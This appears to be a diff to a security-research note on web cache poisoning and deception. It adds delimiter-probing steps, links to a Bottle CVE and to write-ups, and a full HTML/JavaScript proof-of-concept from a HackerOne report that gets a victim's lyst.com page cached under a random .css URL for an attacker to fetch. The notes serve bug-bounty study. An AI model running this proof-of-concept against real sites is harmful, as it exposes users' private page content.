@@ -18,7 +18,6 @@ Load Balancer : The server that distributes the traffic to the origin server
 Delimiter     : A character or string that separates the path from the query string [see more explanation below]
 
 # Detecting Origin Delimiters 
-https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/
 1. Identify a non-cacheable request 
 In that case we hope that what is appended is ignored by the frontend server and makes it to the backend  server.
 2. Send the same request appending a random suffix at the end of the path 
@@ -27,6 +26,11 @@ In that case we hope that what is appended is ignored by the frontend server and
 > abc / ? # % ;
 If the messages are identical, the character or string is used as a delimiter.
 Use Burp Intruder 
+# & URL delimiters in the real world 
+## CVE from web framework(bottle) using ; as delimiter 
+https://security.snyk.io/vuln/SNYK-PYTHON-BOTTLE-1017108
+https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages
+https://github.com/python/cpython/blob/main/Lib/urllib/parse.py#L739
 
 What does a Delimiter mean or does exactly? The delimiter is a character, that when the url parser reaches it a logical stop in parsing is decided there whatever character/s that follows
 at character is considered as not part of the URL.
@@ -281,6 +285,44 @@ PLS
 TAR  
 XLSX  
 
+# LYST Web Cache Poisoning POC Script 
+https://hackerone.com/reports/631589
+`
+<html>
+  <head> </head>
+  <body>
+    <script>
+      var cachedUrl = "https://www.lyst.com/" + generateId() + ".css";
+      const popup = window.open(cachedUrl);
+      function generateId() {
+        var content = "";
+        const alphaWithNumber = "QWERTZUIOPASDFGHJUKLYXCVBNM1234567890";
+        for (var i = 0; i < 10; i++) {
+          content += alphaWithNumber.charAt(
+            Math.floor(Math.random() * alphaWithNumber.length)
+          );
+        }
+        return content;
+      }
+      var checker = setInterval(function () {
+        if (popup.closed) {
+          clearInterval(checker);
+        }
+      }, 200);
+      var closer = setInterval(function () {
+        popup.close();
+        document.body.innerHTML =
+          'Victims content is now cached <a href="' +
+          cachedUrl +
+          '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' +
+          cachedUrl +
+          "</b>";
+        clearInterval(closer);
+      }, 3000);
+    </script>
+  </body>
+</html>
+`
 
 https://zhero-web-sec.github.io/cache-deception-to-csrf/
 Web Cache Deceptionce to CSRF form 
